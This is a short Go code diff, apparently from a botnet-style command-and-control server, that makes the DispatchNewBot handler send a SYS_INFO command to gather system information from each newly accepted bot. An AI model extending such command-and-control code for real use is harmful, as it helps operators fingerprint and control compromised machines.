@@ -56,6 +56,10 @@ func DispatchNewBot(w http.ResponseWriter, r *http.Request, msgDecryptKey *rsa.P
 	if err := bot.Send(&protocol.Command{Type: protocol.CommandTypeAccepted}); err != nil {
 		return nil, fmt.Errorf("could not send ACCEPTED command to bot %s: %s", bot.ID, err)
 	}
+	// get some info on the new bot
+	if err := bot.Send(&protocol.Command{Type: protocol.CommandTypeSysInfo}); err != nil {
+		return nil, fmt.Errorf("could not send SYS_INFO command to bot %s: %s", bot.ID, err)
+	}
 	return bot, nil
 }
 
